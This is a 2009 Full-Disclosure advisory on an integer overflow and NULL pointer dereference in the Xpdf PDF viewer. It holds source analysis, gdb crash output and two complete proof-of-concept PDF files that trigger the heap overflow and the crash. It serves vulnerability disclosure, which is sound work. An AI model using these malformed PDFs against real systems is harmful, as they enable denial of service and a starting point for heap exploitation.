@@ -1,0 +1,763 @@
+Name:                 Xpdf - Integer overflow which causes heap overflow and NULL pointer derefernce
+Author:               Adam Zabrocki / HISPASEC (<pi3@itsec.pl> or <adam@hispasec.com>)
+Date:                 July 06, 2009
+
+
+Issue:
+
+Xpdf allows local and remote attackers to overflow buffer on heap via integer overflow vulnerability.
+Xpdf is prone to NULL pointer dereference attack.
+
+
+Description:
+
+Xpdf is an open-source viewer for Portable Document Format (PDF) files.
+Xpdf project also includes a PDF text extractor, PDF-to-PostScript converter, and various other
+utilities. Xpdf runs under the X Window System on UNIX, VMS, and OS/2. The non-X components
+(pdftops, pdftotext, etc.) also run on Win32 systems and should run on pretty much any system with a
+decent C++ compiler.
+Xpdf is designed to be small and efficient. It can use Type 1, TrueType, or standard X fonts. 
+
+
+Details:
+
+
+Let's look in code:
+
+"./goo/gmem.cc"
+void *gmalloc(int size) GMEM_EXCEP {
+#ifdef DEBUG_MEM 
+   ...
+#else 
+  void *p;
+
+  if (size < 0) {
+#if USE_EXCEPTIONS 
+   ...
+#else 
+    fprintf(stderr, "Invalid memory allocation size\n");
+    exit(1);
+#endif 
+  }
+  if (size == 0) {
+    return NULL;
+  }
+  if (!(p = malloc(size))) {
+#if USE_EXCEPTIONS 
+   ...
+#else 
+    fprintf(stderr, "Out of memory\n");
+    exit(1);
+#endif 
+  }
+  return p;
+#endif 
+}
+
+Ok. So if we pass negative value to gmalloc() than xpdf finish work via
+exit() call
+and print to stderr "Invalid memory allocation size\n". If we pass 0
+(zero) value
+than function return NULL. In other cases there will be normal call to
+malloc() func.
+
+Ok so let's look further.
+
+"./splash/Splash.cc"
+SplashError Splash::drawImage(SplashImageSource src, void *srcData,
+                              SplashColorMode srcMode, GBool srcAlpha,
+                              int w, int h, SplashCoord *mat) {
+...
+...
+  SplashClipResult clipRes, clipRes2;
+  int yp, yq, yt, yStep, lastYStep;
+  int xp, xq, xt, xStep, xSrc;
+...
+  SplashColorPtr colorBuf, p;
+...
+#if SPLASH_CMYK 
+  int pixAcc0, pixAcc1, pixAcc2, pixAcc3;
+#else 
+  int pixAcc0, pixAcc1, pixAcc2;
+#endif 
+...
+  int nComps, n, m, i, j;
+
+...
+  // check color modes
+  ok = gFalse; // make gcc happy
+  nComps = 0; // make gcc happy
+  switch (bitmap->mode) {
+  case splashModeMono1:
+  case splashModeMono8:
+    ok = srcMode == splashModeMono8;
+    nComps = 1;
+    break;
+  case splashModeRGB8:
+    ok = srcMode == splashModeRGB8;
+    nComps = 3;
+    break;
+  case splashModeBGR8:
+    ok = srcMode == splashModeBGR8;
+    nComps = 3;
+    break;
+#if SPLASH_CMYK 
+  case splashModeCMYK8:
+    ok = srcMode == splashModeCMYK8;
+    nComps = 4;
+    break;
+#endif 
+  }
+  if (!ok) {
+    return splashErrModeMismatch;
+  }
+...
+...
+
+  // compute Bresenham parameters for x and y scaling
+  yp = h / scaledHeight;
+  yq = h % scaledHeight;
+  xp = w / scaledWidth;
+  xq = w % scaledWidth;
+
+  colorBuf = (SplashColorPtr)gmalloc((yp + 1) * w * nComps);
+<- [1] !!!
+  if (srcAlpha) {
+    alphaBuf = (Guchar *)gmalloc((yp + 1) * w);
+  } else {
+    alphaBuf = NULL;
+  }
+
+  pixAcc0 = pixAcc1 = pixAcc2 = 0; // make gcc happy
+
+...
+...
+
+  if (srcAlpha) {
+
+...
+<BIG code>
+...
+  } else {
+
+    // init y scale Bresenham
+    yt = 0;
+    lastYStep = 1;
+
+    for (y = 0; y < scaledHeight; ++y) {
+
+      // y scale Bresenham
+      yStep = yp;
+      yt += yq;
+      if (yt >= scaledHeight) {
+        yt -= scaledHeight;
+        ++yStep;
+      }
+      
+      // read row(s) from image
+      n = (yp > 0) ? yStep : lastYStep;
+      if (n > 0) {
+        p = colorBuf;
+        for (i = 0; i < n; ++i) {
+          (*src)(srcData, p, NULL);                 <- [!!]  !!!
+          p += w * nComps;
+        }
+      }
+
+...
+<now we will be looking in code for splashModeRGB8 and splashModeBGR8>
+...
+
+      switch (srcMode) {
+
+...
+...
+
+      case splashModeRGB8:
+      case splashModeBGR8:
+        for (x = 0; x < scaledWidth; ++x) {
+
+          // x scale Bresenham
+          xStep = xp;
+          xt += xq;
+          if (xt >= scaledWidth) {
+            xt -= scaledWidth;
+            ++xStep;
+          }
+
+...
+...
+
+          // compute the filtered pixel at (x,y) after the x and y
+scaling
+          // operations
+          m = xStep > 0 ? xStep : 1;
+          p = colorBuf + xSrc * 3;               <-             [2] !!!
+          pixAcc0 = pixAcc1 = pixAcc2 = 0;
+          for (i = 0; i < n; ++i) {
+            for (j = 0; j < m; ++j) {
+              pixAcc0 += *p++;                   <-             [3] !!!
+              pixAcc1 += *p++;
+              pixAcc2 += *p++;
+            }
+            p += 3 * (w - m);
+          }
+
+...
+...
+<BIG code>
+...
+...
+}
+
+
+We immediately control variable "w" and "h". So if we set variable "w" to value zero (0).
+After that call to gmalloc (in [1]) will return NULL. There is no check what value was returned!
+So in [2] we have p = NULL + xSrc*3, xSrc we can set to 0 (zero) too. So in fact we can set "p" to NULL value. In [3] we have NULL pointer dereference!
+
+Ok let's look for other scenario. What will happen if variable "w" have BIG value? Let's look:
+
+(yp + 1) * w * nComps
+
+"w" we can control immediately, "nComps" have some static value and "yp" we can controle indirectly because:
+
+  yp = h / scaledHeight;
+
+"h" we control once again immediately! So in fact we can do integer overflow and allocate less memory than it should be. For example:
+
+h = 2000000000
+w = 1102
+nComps = 3
+yp / scaledHeight = 15873015, for standard scaledHeight = 126
+
+so it should be => (15873015+1)*1102*3 = 15873016*1102*3 = 52476190896
+but in fact after integer overflow it is:
+yp[15873015]+1)*w[1102]*nComps[3] = 936583344
+
+So it is too little :)
+
+In  this scenario after call to gmalloc() program will go after some
+instruction to code in [!!].
+in fact this is call to some pointer which redirect us to function...
+
+
+"xpdf/SplashOutputDev.cc"
+GBool SplashOutputDev::imageSrc(void *data, SplashColorPtr colorLine,
+                                Guchar *alphaLine) {
+  SplashOutImageData *imgData = (SplashOutImageData *)data;
+...
+  SplashColorPtr q, col;
+...
+  int nComps, x;
+
+...
+
+  if (imgData->lookup) {
+    switch (imgData->colorMode) {
+...
+...
+    case splashModeRGB8:
+    case splashModeBGR8:
+      for (x = 0, p = imgData->imgStr->getLine(), q = colorLine;
+           x < imgData->width;
+           ++x, p += nComps) {
+        imgData->colorMap->getRGB(p, &rgb);
+        *q++ = colToByte(rgb.r);
+        *q++ = colToByte(rgb.g);
+        *q++ = colToByte(rgb.b);
+      }
+      break;
+...
+...
+}
+
+And here is overflow! We have too little allocated memory but program don't know about it and try to convert colors and write in this memory by call:
+
+        *q++ = colToByte(rgb.r);
+        *q++ = colToByte(rgb.g);
+        *q++ = colToByte(rgb.b);
+
+and the end of working loop is via this compare:
+
+	 x < imgData->width;
+
+So we overflow memory.
+
+
+
+
+   Proof of concept
+
+Let's try to do this scenario:
+[root@pi3book xpdf-3.02]# xpdf elo.pdf 
+Error: PDF file is damaged - attempting to reconstruct xref table...
+Naruszenie ochrony pami?ci
+[root@pi3book xpdf-3.02]#
+
+and gdb output:
+
+(gdb) bt
+#0  0x080c222a in SplashOutputDev::imageSrc (data=0xbfffec84,
+colorLine=0xb7fe46de '?' <repeats 200 times>..., alphaLine=0x0) at
+SplashOutputDev.cc:1848
+#1  0x080fedc0 in Splash::drawImage (this=0x81e5878, src=0x80c20d0
+<SplashOutputDev::imageSrc(void*, unsigned char*, unsigned char*)>,
+srcData=0xbfffec84, 
+    srcMode=splashModeRGB8, srcAlpha=0, w=1102, h=2000000000,
+mat=0xbfffec50) at Splash.cc:2532
+#2  0x080c1d1f in SplashOutputDev::drawImage (this=0x81bd0f8,
+state=0x81f0050, ref=0xbfffeebc, str=0x81f0960, width=1102,
+height=2000000000, 
+    colorMap=0x81f8ea0, maskColors=0x0, inlineImg=0) at
+SplashOutputDev.cc:2048
+#3  0x080601d9 in Gfx::doImage (this=0x81e5528, ref=0xbfffeebc,
+str=0x81f0960, inlineImg=0) at Gfx.cc:3657
+#4  0x08066799 in Gfx::opXObject (this=0x81e5528, args=0xbfffef34,
+numArgs=1) at Gfx.cc:3330
+#5  0x080612bd in Gfx::go (this=0x81e5528, topLevel=1) at Gfx.cc:581
+#6  0x080615ea in Gfx::display (this=0x81e5528, obj=0xbffff1ac,
+topLevel=1) at Gfx.cc:553
+#7  0x080a55cb in Page::displaySlice (this=0x81df9f0, out=0x81bd0f8,
+hDPI=90, vDPI=90, rotate=0, useMediaBox=0, crop=1, sliceX=0, sliceY=0,
+sliceW=744, 
+    sliceH=1052, printing=0, catalog=0x81de638, abortCheckCbk=0,
+abortCheckCbkData=0x0) at Page.cc:317
+#8  0x080aa485 in PDFCore::needTile (this=0x81bcab8, page=0x81e5468,
+x=0, y=0) at PDFCore.cc:835
+#9  0x080abc77 in PDFCore::update (this=0x81bcab8, topPageA=1,
+scrollXA=0, scrollYA=0, zoomA=125, rotateA=0, force=1, addToHist=1) at
+PDFCore.cc:658
+#10 0x080de837 in XPDFCore::update (this=0x81bcab8, topPageA=1,
+scrollXA=0, scrollYA=0, zoomA=125, rotateA=0, force=1, addToHist=1) at
+XPDFCore.cc:285
+#11 0x080a6861 in PDFCore::displayPage (this=0xbfffe88c, topPageA=1,
+zoomA=125, rotateA=0, scrollToTop=1, addToHist=1) at PDFCore.cc:292
+#12 0x080ea80a in XPDFViewer (this=0x81a35f8, appA=0x8180298,
+fileName=0x8182b00, pageA=1, destName=0x0, fullScreen=0,
+ownerPassword=0x0, userPassword=0x0)
+    at XPDFViewer.cc:297
+#13 0x080dafe0 in XPDFApp::open (this=0x8180298, fileName=0x8182b00,
+page=1, ownerPassword=0x0, userPassword=0x0) at XPDFApp.cc:228
+#14 0x080edcbb in main (argc=Cannot access memory at address 0x0
+) at xpdf.cc:311
+(gdb) x/i $eip
+0x80c222a <_ZN15SplashOutputDev8imageSrcEPvPhS1_+346>:	mov    %al,0x1(%
+ebx)
+(gdb) i r ebx
+ebx            0xb7fe4fff	-1208070145
+(gdb) x/x $ebx
+0xb7fe4fff:	Cannot access memory at address 0xb7fe4fff
+(gdb) print q
+$1 = (Guchar *) 0xb7fe4fff "?" <Address 0xb7fe5000 out of bounds>
+(gdb) print x
+$2 = 780
+(gdb) print ((SplashOutImageData *)data)->width
+$3 = 1102
+(gdb) up
+#1  0x080fedc0 in Splash::drawImage (this=0x81e5878, src=0x80c20d0
+<SplashOutputDev::imageSrc(void*, unsigned char*, unsigned char*)>,
+srcData=0xbfffec84, 
+    srcMode=splashModeRGB8, srcAlpha=0, w=1102, h=2000000000,
+mat=0xbfffec50) at Splash.cc:2532
+2532		  (*src)(srcData, p, NULL);
+(gdb) print colorBuf 
+$4 = (
+    SplashColorPtr) 0x7ffae008 "\204??a\210?a\210?a\210?`\210?`\210?`
+\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`
+\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`
+\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`
+\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`
+\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`\210?`
+\210"...
+(gdb) print w
+$5 = 1102
+(gdb) print h
+$6 = 2000000000
+(gdb) print nComps 
+$7 = 3
+(gdb) list
+2527	      // read row(s) from image
+2528	      n = (yp > 0) ? yStep : lastYStep;
+2529	      if (n > 0) {
+2530		p = colorBuf;
+2531		for (i = 0; i < n; ++i) {
+2532		  (*src)(srcData, p, NULL);
+2533		  p += w * nComps;
+2534		}
+2535	      }
+2536	      lastYStep = yStep;
+(gdb) print n
+$8 = 15873015
+(gdb) print p
+$9 = (Guchar *) 0xb7fe46de '?' <repeats 200 times>...
+(gdb) 
+
+So it is exactly what we analyze source :) Look now what will happen
+when variable "w" have value 0 (zero) - in fact
+now we will have NULL pointer dereference. Let's look:
+
+[root@pi3book xpdf-3.02]# xpdf jajo.pdf 
+Error: PDF file is damaged - attempting to reconstruct xref table...
+Naruszenie ochrony pami?ci (core dumped)
+[root@pi3book xpdf-3.02]# 
+
+and gdb output:
+
+(gdb) bt
+#0  Splash::drawImage (this=0x81e58e0, src=0x80c20d0
+<SplashOutputDev::imageSrc(void*, unsigned char*, unsigned char*)>,
+srcData=0xbfffec84, 
+    srcMode=splashModeRGB8, srcAlpha=0, w=0, h=2000000000,
+mat=0xbfffec50) at Splash.cc:2667
+#1  0x080c1d1f in SplashOutputDev::drawImage (this=0x81bd100,
+state=0x81f0090, ref=0xbfffeebc, str=0x81f09c0, width=0,
+height=2000000000, 
+    colorMap=0x81f8f00, maskColors=0x0, inlineImg=0) at
+SplashOutputDev.cc:2048
+#2  0x080601d9 in Gfx::doImage (this=0x81e54c8, ref=0xbfffeebc,
+str=0x81f09c0, inlineImg=0) at Gfx.cc:3657
+#3  0x08066799 in Gfx::opXObject (this=0x81e54c8, args=0xbfffef34,
+numArgs=1) at Gfx.cc:3330
+#4  0x080612bd in Gfx::go (this=0x81e54c8, topLevel=1) at Gfx.cc:581
+#5  0x080615ea in Gfx::display (this=0x81e54c8, obj=0xbffff1ac,
+topLevel=1) at Gfx.cc:553
+#6  0x080a55cb in Page::displaySlice (this=0x81dfa08, out=0x81bd100,
+hDPI=90, vDPI=90, rotate=0, useMediaBox=0, crop=1, sliceX=0, sliceY=0,
+sliceW=744, 
+    sliceH=1052, printing=0, catalog=0x81de718, abortCheckCbk=0,
+abortCheckCbkData=0x0) at Page.cc:317
+#7  0x080aa485 in PDFCore::needTile (this=0x81bcac0, page=0x81e5408,
+x=0, y=0) at PDFCore.cc:835
+#8  0x080abc77 in PDFCore::update (this=0x81bcac0, topPageA=1,
+scrollXA=0, scrollYA=0, zoomA=125, rotateA=0, force=1, addToHist=1) at
+PDFCore.cc:658
+#9  0x080de837 in XPDFCore::update (this=0x81bcac0, topPageA=1,
+scrollXA=0, scrollYA=0, zoomA=125, rotateA=0, force=1, addToHist=1) at
+XPDFCore.cc:285
+#10 0x080a6861 in PDFCore::displayPage (this=0x0, topPageA=1, zoomA=125,
+rotateA=0, scrollToTop=1, addToHist=1) at PDFCore.cc:292
+#11 0x080ea80a in XPDFViewer (this=0x81a35f8, appA=0x8180298,
+fileName=0x8182b00, pageA=1, destName=0x0, fullScreen=0,
+ownerPassword=0x0, userPassword=0x0)
+    at XPDFViewer.cc:297
+#12 0x080dafe0 in XPDFApp::open (this=0x8180298, fileName=0x8182b00,
+page=1, ownerPassword=0x0, userPassword=0x0) at XPDFApp.cc:228
+#13 0x080edcbb in main (argc=Cannot access memory at address 0x0
+) at xpdf.cc:311
+(gdb) print w
+$1 = 0
+(gdb) print i
+$2 = 0
+(gdb) print j
+$3 = 0
+(gdb) print n
+$4 = 15873015
+(gdb) print m
+$5 = 1
+(gdb) print p
+$6 = (Guchar *) 0x0
+(gdb) print pixAcc0
+$7 = 0
+(gdb) x/i $eip
+0x80ff720 <_ZN6Splash9drawImageEPFiPvPhS1_ES0_15SplashColorModeiiiPd
++9488>:	movzbl (%ebx),%eax
+(gdb) i r ebx
+ebx            0x0	0
+(gdb) x/x $ebx
+0x0:	Cannot access memory at address 0x0
+(gdb) 
+
+That's all. Everything is exacly what we analyse.
+
+[1] - NULL pointer dereference:
+
+-------------- xpdf-poc-null-pointer-dereference.pdf -------------
+%PDF-1.3
+% 'BasicFonts': class PDFDictionary 
+1 0 obj
+% The standard fonts dictionary
+<< /F1 2 0 R >>
+endobj
+% 'F1': class PDFType1Font 
+2 0 obj
+% Font Helvetica
+<< /BaseFont /Helvetica
+ /Encoding /WinAnsiEncoding
+ /Name /F1
+ /Subtype /Type1
+ /Type /Font >>
+endobj
+% 'FormXob.322a89588a84510d9b1b6ec68c3b4437': class PDFImageXObject 
+3 0 obj
+<< /BitsPerComponent 8
+ /ColorSpace /DeviceRGB
+ /Filter [ /ASCII85Decode
+ /FlateDecode ]
+ /Height 2000000000
+ /Length 61
+ /Subtype /Image
+ /Type /XObject
+ /Width 0 >>
+stream
+GarPPGWE%h$j7l8U/<b)7aWX$5Y7NE=r1HcE+b-(;)F/"d9oEm?)I\-b23C~>endstream
+
+endobj
+% 'Page1': class PDFPage 
+4 0 obj
+% Page dictionary
+<< /Contents 8 0 R
+ /MediaBox [ 0
+ 0
+ 595.2756
+ 841.8898 ]
+ /Parent 7 0 R
+ /Resources << /Font 1 0 R
+ /ProcSet [ /PDF
+ /Text
+ /ImageB
+ /ImageC
+ /ImageI ]
+ /XObject << /FormXob.322a89588a84510d9b1b6ec68c3b4437 3 0 R >> >>
+ /Rotate 0
+ /Trans <<  >>
+ /Type /Page >>
+endobj
+% 'R5': class PDFCatalog 
+5 0 obj
+% Document Root
+<< /Outlines 9 0 R
+ /PageMode /UseNone
+ /Pages 7 0 R
+ /Type /Catalog >>
+endobj
+% 'R6': class PDFInfo 
+6 0 obj
+<< /Author (anonymous)
+ /CreationDate (20090525000415)
+ /Keywords ()
+ /Producer (ReportLab http://www.reportlab.com)
+ /Subject (unspecified)
+ /Title (untitled) >>
+endobj
+% 'R7': class PDFPages 
+7 0 obj
+% page tree
+<< /Count 1
+ /Kids [ 4 0 R ]
+ /Type /Pages >>
+endobj
+% 'R8': class PDFStream 
+8 0 obj
+% page stream
+<< /Filter [ /ASCII85Decode
+ /FlateDecode ]
+ /Length 137 >>
+stream
+Gap(;0b2&S&-VlomLT2HjNbIbQSsFp1e964@g>'<K)ZW1TUhKc(%
+Rpp=t5hkIT:&HH9nYhU`6Inl-6"Js0J5ePfhLZm8G)YG;4cqkJ;Rf)cZMkCEB*ZoFeK5S8`19G:#!aWM18.~>endstream
+
+endobj
+% 'R9': class PDFOutlines 
+9 0 obj
+<< /Count 0
+ /Type /Outlines >>
+endobj
+xref
+0 10
+0000000000 65535 f
+0000000113 00000 n
+0000000209 00000 n
+0000000415 00000 n
+0000000710 00000 n
+0000001052 00000 n
+0000001186 00000 n
+0000001397 00000 n
+0000001502 00000 n
+0000001783 00000 n
+trailer
+<< /ID 
+ % ReportLab generated PDF document -- digest
+(http://www.reportlab.com) 
+ [(xZ\271\226b\372\015\305\017\211\022\241\262?\243\347) (xZ\271\226b
+\372\015\305\017\211\022\241\262?\243\347)] 
+
+ /Info 6 0 R
+ /Root 5 0 R
+ /Size 10 >>
+startxref
+1834
+%%EOF
+-------------- xpdf-poc-null-pointer-dereference.pdf -------------
+
+
+[2] - Integer overflow:
+
+-------------- xpdf-poc-integer-overflow.pdf -------------
+%PDF-1.3
+% 'BasicFonts': class PDFDictionary 
+1 0 obj
+% The standard fonts dictionary
+<< /F1 2 0 R >>
+endobj
+% 'F1': class PDFType1Font 
+2 0 obj
+% Font Helvetica
+<< /BaseFont /Helvetica
+ /Encoding /WinAnsiEncoding
+ /Name /F1
+ /Subtype /Type1
+ /Type /Font >>
+endobj
+% 'FormXob.322a89588a84510d9b1b6ec68c3b4437': class PDFImageXObject 
+3 0 obj
+<< /BitsPerComponent 8
+ /ColorSpace /DeviceRGB
+ /Filter [ /ASCII85Decode
+ /FlateDecode ]
+ /Height 2000000000
+ /Length 61
+ /Subtype /Image
+ /Type /XObject
+ /Width 1102 >>
+stream
+GarPPGWE%h$j7l8U/<b)7aWX$5Y7NE=r1HcE+b-(;)F/"d9oEm?)I\-b23C~>endstream
+
+endobj
+% 'Page1': class PDFPage 
+4 0 obj
+% Page dictionary
+<< /Contents 8 0 R
+ /MediaBox [ 0
+ 0
+ 595.2756
+ 841.8898 ]
+ /Parent 7 0 R
+ /Resources << /Font 1 0 R
+ /ProcSet [ /PDF
+ /Text
+ /ImageB
+ /ImageC
+ /ImageI ]
+ /XObject << /FormXob.322a89588a84510d9b1b6ec68c3b4437 3 0 R >> >>
+ /Rotate 0
+ /Trans <<  >>
+ /Type /Page >>
+endobj
+% 'R5': class PDFCatalog 
+5 0 obj
+% Document Root
+<< /Outlines 9 0 R
+ /PageMode /UseNone
+ /Pages 7 0 R
+ /Type /Catalog >>
+endobj
+% 'R6': class PDFInfo 
+6 0 obj
+<< /Author (anonymous)
+ /CreationDate (20090525000415)
+ /Keywords ()
+ /Producer (ReportLab http://www.reportlab.com)
+ /Subject (unspecified)
+ /Title (untitled) >>
+endobj
+% 'R7': class PDFPages 
+7 0 obj
+% page tree
+<< /Count 1
+ /Kids [ 4 0 R ]
+ /Type /Pages >>
+endobj
+% 'R8': class PDFStream 
+8 0 obj
+% page stream
+<< /Filter [ /ASCII85Decode
+ /FlateDecode ]
+ /Length 137 >>
+stream
+Gap(;0b2&S&-VlomLT2HjNbIbQSsFp1e964@g>'<K)ZW1TUhKc(%
+Rpp=t5hkIT:&HH9nYhU`6Inl-6"Js0J5ePfhLZm8G)YG;4cqkJ;Rf)cZMkCEB*ZoFeK5S8`19G:#!aWM18.~>endstream
+
+endobj
+% 'R9': class PDFOutlines 
+9 0 obj
+<< /Count 0
+ /Type /Outlines >>
+endobj
+xref
+0 10
+0000000000 65535 f
+0000000113 00000 n
+0000000209 00000 n
+0000000415 00000 n
+0000000710 00000 n
+0000001052 00000 n
+0000001186 00000 n
+0000001397 00000 n
+0000001502 00000 n
+0000001783 00000 n
+trailer
+<< /ID 
+ % ReportLab generated PDF document -- digest
+(http://www.reportlab.com) 
+ [(xZ\271\226b\372\015\305\017\211\022\241\262?\243\347) (xZ\271\226b
+\372\015\305\017\211\022\241\262?\243\347)] 
+
+ /Info 6 0 R
+ /Root 5 0 R
+ /Size 10 >>
+startxref
+1834
+%%EOF
+
+-------------- xpdf-poc-integer-overflow.pdf -------------
+
+
+   Greets
+
+Guys from HISPASEC, snoop, thorkill, Piotr Bania, guys from
+SecurityReason,
+#lam3rz@IRCNET and #plhack@IRCNET
+
+
+   Disclaimer
+
+This document and all the information it contains is provided "as is",
+without any warranty. The author is not responsible for the
+misuse of the information provided in this advisory. The advisory is
+provided for educational purposes only.
+
+Permission is hereby granted to redistribute this advisory, providing
+that no changes are made and that the copyright notices and
+disclaimers remain intact.
+
+
+   Ending words...
+
+That's all. I test it on version 3.02 with all security patches.
+Probably all versions
+are vulnerability. Thanks and Best regards Adam Zabrocki (pi3 /
+pi3ki31ny).
+
+
+
+   Disclosure Timeline
+
+*) 14 October, 2009  -  Vendor release patch
+...
+...
+*) 27 Jult, 2009  -  replay with vendor
+*) 23 Jult, 2009  -  contact with vendor
+*) 06 July, 2009  -  exploit bug and write advisory
+*) 04 July, 2009  -  found bug
+
+
+
+--
+http://hispasec.com
+http://pi3.com.pl
+
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
